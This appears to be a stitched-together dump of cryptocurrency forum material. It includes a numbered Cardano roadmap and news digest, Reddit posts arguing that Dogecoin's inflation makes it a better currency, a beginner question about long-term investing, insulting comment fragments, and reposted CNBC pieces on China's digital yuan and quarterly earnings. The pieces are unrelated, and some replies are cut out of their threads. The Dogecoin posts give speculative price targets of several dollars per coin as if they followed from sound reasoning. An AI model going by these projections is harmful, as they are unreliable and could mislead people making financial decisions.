27. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul. It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline. Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors. [https://www.youtube.com/watch?v=dUDze81LCWs](https://www.youtube.com/watch?v=dUDze81LCWs)
28. Occam Association President, Mark Berger, also did an interview with Rick McCracken on Cardano Live. He provided some good detail on what Occam would like to deliver and where they currently are in their development. [https://youtu.be/vTBLIZ7voz8](https://youtu.be/vTBLIZ7voz8)
29. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
30. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia. This is a great use case for the Cardano blockchain! [https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/ https://www.scantrust.com/](https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/)
31. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
32. Ourobouros Omega. Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon. Ourobouros Praos was 2017 and it’s still running now. Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
33. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server. Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year. It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
34. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
35. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot. They could also add Hyperledger related permissioned sidechains with this.
36. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way. Hydra will be run by the stake pool operators.
37. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this.
38. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
39. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
40. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
41. Commercial. On the commercial side they are really going to scale things up to the eight figure level. There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.
42. Coinbase now has a Cardano Explainer. [https://www.coinbase.com/learn/crypto-basics/what-is-cardano](https://www.coinbase.com/learn/crypto-basics/what-is-cardano)
43. “Smart people end up in Cardano one way or another.” [https://twitter.com/Adavanz1/status/1378405038608031746](https://twitter.com/Adavanz1/status/1378405038608031746)

48. Dewayne Cameron was on Cardano Live.  Whether you are interested in DeFi or not, this is likely to be one of the big early Cardano based projects.  This interview has all the latest info on Liqwid.  Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work.  At 20:01 Dewayne mentions a “Cardano Dex, or the Dex that IOHK and Emurgo are working on...”  Very interesting tidbit there! [https://youtu.be/JhO5iC08xSA](https://youtu.be/JhO5iC08xSA)
49. The Plutus Pioneer program has been open sourced! Lecture #1 has an extremely good explanation of why the EUTxO model in Cardano is so much more conducive to security and much greater predictability than the account balance model in Ethereum.   [https://github.com/input-output-hk/plutus-pioneer-program](https://github.com/input-output-hk/plutus-pioneer-program)
50. There is now a website that will mint Cardano NFTs for you.  Thanks to Cardano subreddit user Padierfind. [https://www.nft-maker.io/](https://www.nft-maker.io/)
51. Yesterday was “Get ADA Day” with the end of Epoch 258.  I hope everyone did well in their staking. 
52. Here’s a great way to visualize token minting and other on-chain activities thanks to Smaug Stake Pool. [https://pool.pm/](https://pool.pm/)
53. It looks like the automated NFT maker covered yesterday,  [nft-maker.io](https://www.nft-maker.io/), actually charges 10 ADA per NFT.  Just an update on the price there since it was unknown yesterday.  
54. The Cardano tattoo phenomenon continues. This time, we even have one that actually features a depiction of the namesake.

dogecoin,The Economics of Dogecoin or why it can turn into a real currency!,"TLDR: Elon is not stupid.

P.S. I am not an economist, but have a good understanding of how things work (I'm an engineer 😅).

Here is why I think that the title is true at its core. I will provide as many references as possible for you to come to your own conclusion.

Let's get straight to it.

&amp;#x200B;

**Accidentally Correct.**

There were a few decisions made by the developers, (in reality, to make fun of the other cryptocurrencies) that have inadvertently made Dogecoin actually a much better ""currency"" than Bitcoin or even UDS! Let's look at some numbers. Let us see the what are the ""cons"" of Dogecoin according to the experts, and why I think we need to look at data before we believe anyone.

&amp;#x200B;

**The Dogecoin ""cons"" according to the experts.**

You will hear terms like ""Dogecoin is currently infinite"", ""unlimited and ridiculous amount of Doge"", ""not serious/joke"", ""no inherent value"", ""value will be zero soon"", ""major chunk of dogecoin is in a particular wallet"", etc. Let's look at these claims.

&amp;#x200B;

**Dogecoin is inherently inflationary. Is It, compared to what?**

**Dogecoin:** There are [129.21 billion](https://blockchair.com/dogecoin/charts/circulation) dogecoins (as of 17 April 2021, but only around 113 billion have been mined). Every year Dogecoin will allow the addition of \~5 billion coins. That's actually an **increase of \~3.8% next year!**

**USD:** In contrast, **23.6%** of all **USD** were created in the last year! [REF](https://www.thestreet.com/mishtalk/economics/23-6-of-all-us-dollars-were-created-in-the-last-year) And this percentage change is not fixed as we will see in the graph below.

**Bitcoin**: Currently there are [18.63million](https://www.investopedia.com/tech/what-happens-bitcoin-after-21-million-mined/#:~:text=Key%20Takeaways,to%20be%20introduced%20into%20circulation) Bitcoins, and around 4million bitcoins are [lost](https://blockgeeks.com/how-many-bitcoins-are-there/) forever. Between 2020-2024, [656,250](https://www.cmcmarkets.com/en/learn-cryptocurrencies/bitcoin-halving) Bitcoins can be mined (164062.5 per year avg). Even if we ignore the lost Bitcoins, this is an increase of 0.87%. In the first 4 years, 50% of all Bitcoins were already mined!

&amp;#x200B;

Let's see this data through a graph I made below, showing % inflation (increase in coins/currency) per year for BTC, USD, and Dogecoin.

&amp;#x200B;

[""Inflation in volume""](https://preview.redd.it/443e5kcosnt61.png?width=991&amp;format=png&amp;auto=webp&amp;s=a04d665e4fe8b02bf4df7fb138d76d899eda42a5)

&amp;#x200B;

https://preview.redd.it/8e78ain37qt61.png?width=991&amp;format=png&amp;auto=webp&amp;s=5f5bf0975ded3d19ede34ae652c11833e7fe13a7

Source: BTC, [USD](https://www.federalreserve.gov/paymentsystems/coin_currcircvalue.htm), [USD forecast](https://www.forecasts.org/defense.htm) for 2022,  [Dogecoin](https://www.coingecko.com/en/coins/dogecoin/historical_data/usd?start_date=2011-03-01&amp;end_date=2021-04-17). We can predict the change per year for BTC and Dogecoin per year, as their block size is already determined. For USD I have taken the last 8 years of average. BTC and USD values are from 2012 to 2033, while Dogecoin is from 2016-2037. Dogecoin started later, and I have removed the initial few years as both BTC and Dogecoin went from 0 to millions/billions of coin, and that would make this graph weird (USD too started from 0 to a large number in the initial few years).

Just look at the above graph!

Dogecoin is actually very close to [global inflation of 3.51%](https://www.statista.com/statistics/256598/global-inflation-rate-compared-to-previous-year/). The global GDP growth rate in 2017 was [3.14%](https://www.worldometers.info/gdp/).

So based on the ""Dogecoin is inflationary in nature"" argument, we should dump USD as it growing at 9% YoY? What should determine how much new currency shall enter the system? Here are some thoughts:

1. use of currency (and now cryptocurrency) is to help business transactions (ultimately). An increase in economic activity/GDP needs more circulation. An increase in circulation volume shall be dependant on this.
2. 4 million BTC are lost. A lot of USD is blocked in banks. People hoard BTC and USD. This effectively reduces the circulation, hence requiring an increase.
3. US (or world) is not growing at 9%, though USD circulation is.

I don't know what should be an ideal increase in circulation, but GDP growth and lost/hoarded amounts should have a very high correlation with the circulation. China for instance maintained a very good correlation (but recently is entering dark waters).

&amp;#x200B;

[Source: https://merics.org/en/analysis/policy-china-still-puts-growth-deleveraging](https://preview.redd.it/gns8eptoynt61.png?width=850&amp;format=png&amp;auto=webp&amp;s=0a424ba3db8cf014177ef1e86842798b95e23217)

&amp;#x200B;

**Is a low number of available coins/currency helpful?**

1. And a low number of Bitcoins helps no one (IMHO). They are now hard to get, and today each bitcoin is worth $62000-63,000 because there are so few of them. Of course, this increases the value of 1BTC. But would I like to pay you 1BTC today, know that, maybe, in 2025 it can reach $1million!!
2. The value of a currency is dependant on how much it gets used. If low volume and high value make BTC a diamond, diamond it will be. We all will just keep it and not trade it. And something that's not traded is bound to lose its value over a period of time, especially if you have an alternative (imagine finding a trillion carat worth comet one day that can be mined!). BTC already has competition, so there are alternatives.

So "" ""Dogecoin is currently infinite"", ""unlimited and ridiculous amount of Doge"", ""?? No, not true. There is [37T worth of USD in circulation](https://www.rankred.com/how-much-money-is-there-in-the-world/#:~:text=%7C%202021%20Edition,-January%201%2C%202021&amp;text=There%20is%20approximately%20US%20%2437,and%20cryptocurrencies%20exceeds%20%241.2%20quadrillion), because ""we need it for doing our business and transaction"". 37T is all physical money and the money we deposited in savings and checking amount.

The total number of Dogecoins in 2100 would still be 529 Billion.

&amp;#x200B;

**It's not serious or it's a joke and has no inherent value or value will be zero soon.**

1. *A currency is a joke if no one wants to buy/keep it.* Dogecoin at the time of writing is at $0.2865, has a market cap of $37Billion, and had a last 24-hour volume of $51B.
   1. So definitely there is huge interest. Some of the parties/hoarders/keepers are now billionaires or multi-billionaires, and it would be in their interest to keep others interested
   2. This volume currently reflects just the coin transaction value. The real value of Dogecoin will come from its business use. Who all are currently using it?
      1. [48 companies that accept dogecoin for payment](https://www.ibtimes.com/these-48-companies-accept-dogecoin-payment-3161086)
      2. This year we are going to see a [lot many more merchants](https://news.bitcoin.com/dogecoin-adoption-rises-bitpay-merchants-accept-doge-coinflip-1800-atms-list-crypto/) that will support Dogecoin payments.
2. *It has no inherent value or the value will be zero soon.* Well, what is the value behind USD? It is not gold-backed, and Feds can print it as much as they want?
   1. As discussed, the currency has value if its use increases. BTC inherently, due to being expensive, unpredictable price (which means we can't charge someone a fixed amount of BTC, as that can be any number of USD within few days) is not an ideal candidate for business transactions.  BTC will become more like diamonds or gold.
   2. If USD can survive with a 9% inflation, then at 3.8% Dogecoin is safe.
   3. Value won't become zero and it is up to the Dogecoin community (some of who have millions/billions to lose) now to make it valuable by pushing merchants, vendors, and companies to use Dogecoin for transactions.

&amp;#x200B;

**A major chunk of dogecoin is in a particular wallet**

1. This comes from the fact that [28.3% of Dogecoin](https://bitinfocharts.com/top-100-richest-dogecoin-addresses.html) are in a single wallet.
   1. If you click the link above, you can see that the wallet owner is actively transacting. So it is a matter of time that this guy/company start cashing out
   2. 50% of the world's net worth belongs to the [top 1%](https://en.wikipedia.org/wiki/Distribution_of_wealth#:~:text=The%20pyramid%20shows%20that%3A,97%25%20of%20the%20total%20wealth).
   3. Top [0.1% in US](https://www.theguardian.com/business/2014/nov/13/us-wealth-inequality-top-01-worth-as-much-as-the-bottom-90) worth is as much as the bottom 90%
   4. 5.216 million out of 18.63 million bitcoins are with these [500 people](https://99bitcoins.com/bitcoin-rich-list-top500/). There are 64 million wallets in existence. i.e. 0.00078125% of the top bitcoin holders (500 people) have 28% of the bitcoins.  Also, remember that 4 million bitcoins are [lost forever](https://bitcoinist.com/estimated-4-million-bitcoin-lost-forever-by-users-forgetfulness/)! OOPS!

&amp;#x200B;

**How high can Dogecoin can go?**

This is all IMHO:

1. Assumptions:
   1. Dogecoin is only as 1/10th as useless/useful as Bitcoin is in its actual business/commercial use (and have only 1/10 of crypto fan's sentiments). Then if Bitcoin is between [$275k to $1M](https://primexbt.com/blog/bitcoin-price-prediction-forecast/) by 2025+, i.e. a market cap of $5.225-19Trillion, dogecoin could be $0.5-1.9Trillion. With roughly a 150billion dogecoins in circulations, **each dogecoin can be anywhere between $3.33 to $12.66 around 2025.**
   2. But let us assume a rather useful scenario where in the next 8 years, the dogecoin community becomes so big that worlds 0.1% (why this weird number?) of all assets like money circulation, investments, derivatives, and cryptocurrencies are transacted via Dogecoin (nothing is impossible). Currently, there is an [astonishing $1.2 quadrillion](https://www.rankred.com/how-much-money-is-there-in-the-world) in all of these! Assuming this doubles up by 2030, we are talking about $2.4 quadrillion (this is a lower range)!
      1. BTC is currently around [0.096%](https://coinmarketcap.com/) of this insane $1.2 quadrillion figure *without adding actual merchandise/business usage (this is also a lower number as 1.2 does not include recent exponential growth in crypto)!*
   3. By being more useful (commercial/business adoption), and representing 0.01% of all assets, dogecoin can represent $2.4trillion in total wealth. **That would mean that each dogecoin would be around $16**. This is by the way without the ""craze"" around cryptocurrencies. If Dogecoin does get adopted in business and other transactions, it is bound to get hyped up.

&amp;#x200B;

**Other notes:**

1. Dogecoin is in [active](https://github.com/dogecoin/dogecoin/issues) development.
2. From [this](https://www.reddit.com/r/dogecoin/comments/2cgk64/can_someone_please_tell_me_the_pros_and_cons_to/) Reddit post. Dogecoin:
   1. has faster confirmation posts
   2. has lower transaction fees  (both these points makes it suitable for the business transaction)
   3. has a lower value which helps in tipping and gaming currency (and is meaningful, like ""I would like to tip 1Dogecoin, vs 0.00000634BTC)
   4. have devoted community
3. Since people can't actually hoard dogecoins (5B will be released anyways every year), it will tend to have more practical usage in the economy, and hopefully ration value (something like $1-100 and not $100000...).

I hope this was useful to someone! :)

CryptoCurrency,Safest / cheapest way to invest slowly on the long run,"Hello,

I am sorry if this question seems redundant, but I can not find a clear answer.

I am looking for the cheapest way to invest into BTC or ETH, little by little, on the very long run. Let's say I would like to invest 50€ a month for 10 years. No trading, no gambling around. I am putting money on the side for somebody else, and my bank's interest rates are lower than crypto's gains.

I want these funds to be secure, and will therefore use a wallet. My questions are:

1. which platforms are the cheapest to buy BTC or ETH in small quantities, then transfer them to a wallet?

2. There are fees to transfer crypto to wallets. How often should I transfer my assets from the platform to my wallet? I don't want to loose all the gains in transfer fees.

3. I am very good at backup and strong passwords. Considering this, why should I use a hardware wallet compared to a software one?

4. Best software wallet, cross-platform, for this scenario?

&gt; Garbage logic. You're assuming (for no reason) that the mix of transactions would stay identical to those from about six years ago.

The vast majority of that metric is bullshit, since it's counting the noise.cash transactions' total output rather than just the tips. For example, if an address sends 1 cent to a user, and $100 back to itself, it counts this as a $100.01 transaction. This means the numbers are totally bogus. Any mention of that on the thread?

&gt; I agree that the concept of free speech is valuable, but not this goofy “force-private-forums-to-allow-me-to-say-whatever-I-want” version. The valuable “free speech” is where nobody can arrest you or take your money for saying something they disagree with. Is that happening here? No. **So shut the fuck up**.

&gt; The flip side of the coin is that nobody is forced to listen to stuff they don’t care about. If people want unfiltered and uncensored discussion, they can go on 4chan. If they prefer stricter moderation, they can go elsewhere. Look at that: the free market and freedom of speech in action.

&gt; Just to make it clear to any readers that you're utterly full of shit, here's the operating US legal standard on the matter (Ver was indicted in US Federal Court):

&gt;&gt;    That a guilty plea is a grave and solemn act to be accepted only with care and discernment has long been recognized. Central to the plea and the foundation for entering judgment against the defendant is the defendant's admission in open court that he committed the acts charged in the indictment. He thus stands as a witness against himself and he is shielded by the Fifth Amendment from being compelled to do so—hence the minimum requirement that his plea be the voluntary expression of his own choice. But the plea is more than an admission of past conduct; it is the defendant's consent that judgment of conviction may be entered without a trial—a waiver of his right to trial before a jury or a judge. Waivers of constitutional rights not only must be voluntary but must be knowing, intelligent acts done with sufficient awareness of the relevant circumstances and likely consequences.

&gt; Pay particular attention to the bolded parts, **asshole**. For even more support, let's look at the Federal Rules of Criminal Procedure -- specifically Rule 11(b)(3) and its Notes:

To get the 300 character post requirement \*sigh\* here's some information on it:

Heres an article on it: [https://www.cnbc.com/2021/03/05/chinas-digital-yuan-what-is-it-and-how-does-it-work.html#:\~:text=What%20is%20the%20digital%20yuan,will%20be%20paid%20on%20it](https://www.cnbc.com/2021/03/05/chinas-digital-yuan-what-is-it-and-how-does-it-work.html#:~:text=What%20is%20the%20digital%20yuan,will%20be%20paid%20on%20it).

GUANGZHOU, China — China is arguably leading the world in developing a national digital currency, a project it has been working on since 2014.

The People’s Bank of China (PBOC) has been spearheading work on the digital yuan, a so-called central bank digital currency (CBDC) that aims to replace some of the cash in circulation.

Real world trials are already underway in the world’s second-largest economy. Here’s what we know so far about the digital yuan or its official name — the Digital Currency Electronic Payment (DCEP).

## What is the digital yuan?

It’s effectively a way for the central bank to digitalize bank notes and coins in circulation. The Chinese market is already very advanced in cashless payments. The digital yuan would be a way to speed that process up.

It will be legal tender in China and no interest will be paid on it.

“The use of cash is decreasing. Eventually cash will be replaced by something in digital format. That is one of the big drivers behind this,” Yan Xiao, project lead for digital trade at the World Economic Forum, told CNBC.

## Why is it being introduced?

Fan Yifei, deputy governor of the PBOC, said last year that there is a “pressing need to digitalize cash and coin” as producing and storing these currently is expensive. In an article in state-backed publication [Yicai Global](https://www.yicaiglobal.com/news/thoughts-on-cbdc-operations-in-china), Fan said cash and coins are not easy to use, they’re easy to counterfeit and because of their anonymity, could be used for illicit purposes.

The PBOC sees a number of other benefits to the digital yuan.

In a separate article, Fan outlined how a CBDC could make payments more efficient and improve the transmission of monetary policy. Fan also argues that a digital yuan could help with financial stability through a system of “controllable anonymity.” This is where the payments would be anonymous to some degree, but data analysis tools could help the central bank catch illegal activities.

Another reason behind the PBOC’s efforts could be to increase competition in the payments space and reduce systemic risk. China’s digital payments arena is dominated by Alipay, which is run by [Alibaba](https://www.cnbc.com/quotes/9988-HK) affiliate Ant Group, as well as WeChat Pay, run by internet giant [Tencent](https://www.cnbc.com/quotes/700-HK).

“The existing system is owned by private companies. Should Alipay or WeChat pay goes bankrupt, which is extremely unlikely, it creates systematic risk,” Linghao Bao, analyst at Trivium China, told CNBC. “The biggest reason for them (the PBOC) to do this is to level the playing field. Another reason is maybe create a new platform payments system that will increase efficiency.”

## How will the digital yuan work?

There are two aspects to the question: distribution and then eventually how it will be spent.

Distribution will be conducted via a so-called two-tier system. That means the PBOC will distribute the digital yuan to commercial banks. The commercial banks will be responsible for getting the currency into the hands of consumers. This could include services to allow consumers to exchange their coins and cash for digital yuan.

China has already given away millions of dollars worth of the digital currency in [real-world trials](https://www.cnbc.com/2021/02/08/china-to-hand-out-1point5-million-in-lunar-new-year-digital-currency-test.html) in a number of cities including [Shenzhen](https://www.cnbc.com/2020/10/12/china-digital-currency-trial-over-1-million-handed-out-in-lottery.html), [Chengdu](https://www.cnbc.com/2021/02/24/chinese-city-chengdu-launches-6-million-digital-currency-test.html) and [Suzhou](https://www.cnbc.com/2020/12/07/china-hands-out-digital-yuan-in-trial-as-jdcom-accepts-the-currency.html). These involve the local government handing out a certain amount of yuan via a lottery. Users usually have to download a separate app to receive the currency. [JD.com](https://www.cnbc.com/quotes/9618-HK), one of China’s biggest e-commerce players, was involved in the trial and [allowed customers to purchase items with the digital yuan](https://www.cnbc.com/2020/12/07/china-hands-out-digital-yuan-in-trial-as-jdcom-accepts-the-currency.html).

📷\*\*A man counts 100 RMB notes with the Chinese flag in the background.\*\**Sheldon Cooper | SOPA Images | LightRocket via Getty Images*

At this point, it’s unclear how users might actually hold and spend digital yuan when it is rolled out nationwide. The most popular form of mobile payment in China relies on so-called quick response (QR) codes. Users can display this barcode in their Alipay or WeChat app in a store and the merchant will scan it.

WEF’s Xiao says it’s likely commercial banks could integrate similar functionality into their apps. And that Alipay and WeChat Pay could have a section of their apps dedicated to digital yuan. Meanwhile, smartphone makers could also create digital yuan wallets for their devices.

“It will be interesting to see how phone companies seize the opportunity to become payments player in the market,” Xiao said.

The PBOC’s Fan also said that commercial banks already have the infrastructure to distribute the digital yuan and it’s better that they do it rather than the central bank.

“To build a separate system would be a tremendous waste of such existing resources,” he said.

## So is this designed to compete with the tech giants?

In some regard, it’s designed to increase competition with Alipay and WeChat Pay but not to totally replace them.

“The way I see it is digital yuan is not direct competitor to Alipay or WeChat Pay but a new platform that allows other players to come in and compete with WeChat and Alipay,” Trivium China’s Bao said. “Those could be commercial banks or other payment companies.”

The PBOC’s Fan also said the proposed two-tier model can help to “avert disintermediation in the financial sector” because the central bank will not be competing with the commercial banks.

## Is the digital yuan like bitcoin?

No. Bitcoin is a so-called decentralized cryptocurrency. That means that it is not controlled by any central authority like a central bank, unlike the digital yuan which will be issued by the PBOC.

[Bitcoin is also built on a technology known as blockchain](https://www.cnbc.com/2018/06/18/blockchain-what-is-it-and-how-does-it-work.html). It’s unclear at this point what kind of technical make up the digital yuan would have.

Proponents of bitcoin also tout the anonymity of the digital currency.",cryptocurrency
CryptoCurrency,Unpopular PSA: support your local Doge holder.,"Disclosure:  I do not own any Doge. Yes I’ve heard the stats, 10,000 Doge are created every minute. From there, it would take 10,000 Doge bought a minute just to keep Doge at the same price.

We can all say that Doge is trash. It’s dog water. It’s so inflationary, Air Bud is its mascot but let’s take a step back for a second.

Think how many people entered into the space because of Doge. Think of how our shared goal in crypto in general is to disprove that fiat currency is superior. Doge not only introduces people into the space but also refutes traditional monetary policy like few cryptos have done.

With that being said, I say “hodl forever” Doge holders. And welcome to the club. I’m not going to pull a Robinhood and tell you what to do with your money. Who knows, this meme may be a self-fulfilling prophecy as Fortune 500s look to capitalize on the Doge hype.

For those of you outside of Doge looking in, support the hodlers. Answer their questions. This is a brand new world and we all remember what that’s like. Wallet addresses and seed phrases may seem scary and foreign. Pay it forward!

All that to sum it up in one phrase:  to the moon!

So here’s two answers for you to explain things better.

This is a common question so I have written a copy and paste so I don’t have to re-write it. Hope these help you :) if you have questions afterward let me know.

Question: Mining Dogecoin. How new Dogecoin are created and enter the market/supply. It there an infinite supply of Dogecoin being produced? Comparison to Bitcoin and the US dollar.

Answer: mining is the process of creating new cryptocurrency by solving a computational puzzle. mining is necessary to maintain the ledger of transactions upon which cryptocurrency is based. Miners have become very sophisticated over the last several years using complex machinery to speed up mining operations. Approximately 600,000 dogecoins are produced per hour and 5,256,000,000 (5.26 billion) per year and there are currently approximately 128,000,000,000 (128 billion) Dogecoin. Now let’s compare this information to what we know about Bitcoin. Bitcoin currently has a supply of 18.5 million. Currently 900 Bitcoin are mined per day or 328,500 per year. However, unlike Dogecoin, Bitcoins mining rate is not fixed. Bitcoin has something known as a Bitcoin halving which means at some point in the future instead of 900 per day being mined 450 are mined. Now let’s compare Dogecoin and Bitcoin to the US Dollar. The US Dollar has an estimated paper money supply (more on this covered in a later section) of approximately (1.2 to 2 trillion) and in 2019 the federal reserve printed 188.3 billion paper dollars. This means that there is 10 times more supply of dollars to Dogecoin and the government prints 37 times more dollars than Dogecoin is mined per year. It is also important to note that this increase in supply of Dogecoin is fixed. It never changes. The federal reserve can change how much they print any given year. Many people think that this means that the supply of Dogecoin is infinite or infinitely increasing. That is not true in the span of our life time. It will take approximately 24 years for the supply of Dogecoin to double and it will take 360 years for the supply of Dogecoin to reach the current supply of the US Dollar. That’s without taking into account the fact that federal reserve adds more dollars each year than Dogecoin adds to its supply each year. Technically speaking the supply of Dogecoin will eventually reach infinity if given enough time but you have to remember that infinity isn’t an actual number. You can’t mine “infinite” dogecoin because infinity isn’t a number. It’s a mathematical concept to describe something that is boundless. Dogecoin doesn’t have a boundless increase. It has a fixed increase a set amount added at a specific interval. So in practical terms for the purpose of using Dogecoin as a legitimate currency, this infinite argument against Dogecoin doesn’t matter. In fact it’s actually way better than Bitcoin at exchanging goods and services because of this fact. That is why the price per Bitcoin is 40,000 dollars and the price per Dogecoin is .07 with a realistic possibility of only reaching $288.60 at current market conditions. That is why it costs .00012 Bitcoin for milk but only 50 Dogecoin for that same commonly traded commodity. That’s why Bitcoin will be treated like digital gold. That is why Dogecoin will be considered the next dollar. The price per coin are inherently different because their supplies are different.

Question: Should Dogecoin have a cap on its supply. Inflation and deflation Infinite supply / no cap vs cap in regarding to cryptocurrency.

Answer: First of all - the original developers of Dogecoin have already stated that they will NOT be adding a cap. Adding a cap fundamentally changes Dogecoin at its core level and they’re just not going to do it. Here is the direct answer from the Dogecoin developers: “The interest was already built by people trying to trick others in buying an asset they themselves do not understand and your link is to a petition that tricks people into asserting social pressure towards changing the core parameters of an asset that have been there since its launch. We believe that what you're really doing is trying to get rich at the cost of others and when that failed because you ran out of victims and money, you come here asking us to bail you out. However, we will not bail you out, as with great freedom comes great responsibility. We take ours seriously and we hope that you will too in the future. We have now closed this topic. Request denied.” - Patrick lodder Dogecoin developer.

Second response “A, block reward is needed to secure Dogecoin network in a decentralized manner. Dogecoin is merge-mined with Litecoin, and that makes it somewhat secure against PoW attacks. But if Dogecoin reward will be too low, some Litecoin miners may drop Dogecoin, and our security will suffer. From this point of view, bigger reward is better. If you propose reducing the reward over time, you must also propose a solid way to keep Dogecoin secure. Now about the economic aspect. Current Dogecoin issue rate, taken relative to current total amount, is low, it's almost nothing compared to all the other factors that affect Dogecoin value. If you look at Dogecoin price chart since the introduction of current issue schedule, you will not see effects of ""inflation"" for all the wild price changes caused by other factors. And this already low issue rate gets even smaller over time, compared to total amount of dogecoins. The only real reason for these ""cap"" proposals is trying to ""sell"" Dogecoin to investors under the premise of possibly increased scarcity in the future. In my opinion, we don't need to try to appeal to investors. Dogecoin value will be increasing because of strong community and increased usage. And the fact that Dogecoin value increases is already enough for investors to jump in and increase it even more.”

You can read the full response to this directly from the developers here: https://github.com/dogecoin/dogecoin/issues/1674

Even if they DID add a cap it would actually be LESS beneficial for Dogecoin as a currency.

Here’s some economics explaining why. Inflation and deflation are common economic terms used to explain the change in the inherent value of a currency. This means that that 1 US Dollar today does not have the same value or “worth” as it did, for example, in 1950. Inflation is a situation of rising prices in the economy. A more exact definition of inflation is a sustained increase in the general price level in an economy. Deflation on the other hand occurs when the inflation rate falls below 0%, that is a negative inflation rate. While inflation reduces the value of a currency over time, a sudden deflation of a currency increases its relative value. This would allow more goods and services to be bought than before with the same amount of currency. Deflation can be a factor in leading to a recession and also result in a deflationary spiral.

10a) What does all this mean with regards to cryptocurrency, specifically Bitcoin versus Dogecoin?

Well - Bitcoin is stagnant or deflationary over time, while Dogecoin is inflationary overtime. This is due to the way they are architected and mined, and how new coins are added into their respective markets - covered in other section. What gets misunderstood is which one is “better” or rather ""the lesser evil"".

10b)	Dogecoin doesn't need a supply limit like Bitcoin, because in the long run it will be much easier to exchange Dogecoin for goods and services, than with other crypto currencies or regular currencies for that matter. If Bitcoin wants to become a real global currency with buying power, not just a speculation tool to exchange it for a few thousand debt based USD, when it hits a new record high every few months or years, its supply will have to grow inevitably. Our current money is backed by signatures on debt contracts, not on real values. But it works, because we believe in it, even if it will be our downfall if it continues like this. Dogecoin is different. Dogecoin has a set amount of coins entering the market by the minute. There are plenty of spreadsheets out there showcasing exactly how much many Dogecoin will be in circulation at any given moment of time. People get confused because they think inflation is a bad thing, when in fact it is actually beneficial in small quantities and beneficial to the longevity of a currency.

Currencies have inflation - commodities don’t. Dogecoin is better suited to be a currency than Bitcoin is. Bitcoin is better suited to be a digital version of gold.",cryptocurrency

# **Concerns over inflationary pressure on earnings will test stocks in the week ahead - [(Source)](https://www.cnbc.com/2021/04/16/investors-look-for-hints-of-inflation-in-earnings-in-the-week-ahead.html)**
*****
&gt; Earnings will be the major focus for investors in the week ahead, as they home in on whether rising costs are squeezing margins and signaling a build in inflationary pressures.
*****
&gt; From Coca-Cola and IBM to Johnson &amp; Johnson and Netflix, investors will hear from a broad swath of corporate America.
*****
&gt; So far, with one week in, companies are beating earnings estimates by a wide margin of more than 84%, according to Refinitiv.
*****
&gt; This three-month period is the first to be compared to year earlier profits that were affected by the pandemic. Profit growth for the S&amp;P 500 is a stunning 30.2% for the quarter so far, based on actual reports and estimates.
*****
&gt; That makes it the best three-month period since the third quarter of 2010, according to FactSet.
*****
&gt; # Signs of margin pressures?
&gt; Major banks, like JPMorgan Chase, Goldman Sachs and Bank of America reported better than expected profits in the past week.
*****
&gt; The S&amp;P 500 ended the week at a record high of 4,185, a gain of 1.4%. The Dow, higher for a fourth week, gained 1.2 to end the week at a record 34,200. Nasdaq gained 1.1% for the week, finishing at 14,052.
*****
